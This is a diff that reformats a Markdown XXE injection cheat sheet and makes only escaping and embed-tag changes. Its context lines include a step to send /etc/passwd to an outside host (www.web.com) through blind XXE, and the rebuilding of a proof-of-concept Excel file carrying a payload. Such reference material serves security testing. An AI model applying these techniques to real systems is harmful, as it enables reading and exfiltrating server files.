@@ -1,4 +1,4 @@
-# XML External Entity \(XXE\)
+# XML External Entity (XXE)
 
 ## Exploiting XXE to retrieve files
 
@@ -70,7 +70,7 @@ The easiest way to test for a blind XXE is to try to load a remote resource such
 <r></r>
 ```
 
-Send the content of `/etc/passwd` to `www.web.com` \(you may receive only the first line\).
+Send the content of `/etc/passwd` to `www.web.com` (you may receive only the first line).
 
 ```bash
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -141,7 +141,7 @@ Alternativly, add your payload in `xl/sharedStrings.xml`:
 
 Rebuild the Excel file.
 
-```text
+```
 $ zip -r ../poc.xlsx *
 updating: [Content_Types].xml (deflated 71%)
 updating: _rels/ (stored 0%)
@@ -163,7 +163,7 @@ updating: xl/sharedStrings.xml (deflated 17%)
 
 ## References
 
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection\#exploiting-xxe-to-retrieve-files" %}
-
-
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files" %}
+XXE Payloads Repository
+{% endembed %}
 
